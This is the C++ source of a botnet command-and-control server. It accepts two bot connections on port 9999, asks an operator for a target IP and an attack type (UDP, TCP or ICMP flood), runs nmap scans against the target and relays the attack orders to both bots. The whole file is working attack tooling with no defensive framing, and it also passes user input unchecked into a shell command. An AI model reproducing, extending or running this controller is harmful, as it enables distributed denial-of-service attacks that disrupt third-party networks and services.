#include <iostream>
#include <netinet/in.h>
#include <unistd.h>
#include <cstring>
using namespace std;
int main() {
    int serverSock = socket(AF_INET, SOCK_STREAM, 0);
    if (serverSock < 0) {
        cerr << " Failed to create socket.\n";
        return 1;
    }

    sockaddr_in serverAddr{};
    serverAddr.sin_family = AF_INET;
    serverAddr.sin_port = htons(9999);
    serverAddr.sin_addr.s_addr = INADDR_ANY;

    if (bind(serverSock, (sockaddr*)&serverAddr, sizeof(serverAddr)) < 0) {
        cerr << "Bind failed.\n";
        return 1;
    }

    listen(serverSock, 1);
    cout << "Waiting for bots to connect..." << endl;

    sockaddr_in clientAddr{};
    socklen_t len = sizeof(clientAddr);

    int bot1 = accept(serverSock, (sockaddr*)&clientAddr, &len);
    cout << "Bot 1 connected." << endl;
    
    int bot2 = accept(serverSock, (sockaddr*)&clientAddr, &len);
    cout << "Bot 2 connected." << endl;

    
        int ch,targetPort;
        char targetIP[16];

        cout << "\nChoose attack type:\n1. UDP\n2. TCP\n3. ICMP\n4. Exit> " << endl;
        cin >> ch;

        switch (ch){
        
        case 1: {
        cout << "Enter the ip address you want to attack" << endl;
        cin >> targetIP;
        
        cout << "[*] Scanning network for open udp ports of given target using nmap..." << endl;
        string command = "sudo nmap -sU -p 53,67,68,69,123,137,138,161,162,514,500 --open ";
        command += string(targetIP);
        int result = system(command.c_str());

         if (result != 0) {
        std::cerr << "[-] Scan failed!" << std::endl;
        } 
        else {
        std::cout << "[+] Scan completed successfully." << std::endl;
        }
        
        cout << "Enter the port" << endl;
        cin >> targetPort;
        break;}
        
        case 2: {
        cout << "Enter the ip address you want to attack" << endl;
        cin >> targetIP;
        
        cout << "[*] Scanning network for open tcp ports of given target using nmap..." << endl;
        string command = " nmap -sS -p 21,22,23,25,80,443 --open ";
        command += string(targetIP);
        int result = system(command.c_str());

         if (result != 0) {
        std::cerr << "[-] Scan failed!" << std::endl;
        } 
        else {
        std::cout << "[+] Scan completed successfully." << std::endl;
        }
        
        cout << "Enter the port" << endl;
        cin >> targetPort;
        break;}
        
        case 3: {
        cout << "Enter the ip address you want to attack" << endl;
        cin >> targetIP;
       
        break;}
        
        case 4:{
        cout << "Exiting program....." << endl;
        exit(0);
        break;}
        }
        

        switch (ch){
        
        case 3:{
        //Send to Bot1
        send(bot1, &ch, sizeof(ch), 0);
        send(bot1, targetIP, sizeof(targetIP), 0);

        // Send to Bot 2
        send(bot2, &ch, sizeof(ch), 0);
        send(bot2, targetIP, sizeof(targetIP), 0);
        break;}
        
        default:{
        //Send to Bot 1
        send(bot1, &ch, sizeof(ch), 0);
        send(bot1, targetIP, sizeof(targetIP), 0);
        send(bot1, &targetPort, sizeof(targetPort), 0);

        //Send to Bot 2
        send(bot2, &ch, sizeof(ch), 0);
        send(bot2, targetIP, sizeof(targetIP), 0);
        send(bot2, &targetPort, sizeof(targetPort), 0);
        break;}
        }
        
        
        cout << "[✓] Command sent to both bots." << endl;
    

    close(bot1);
    close(bot2);
    close(serverSock);
    return 0;
}

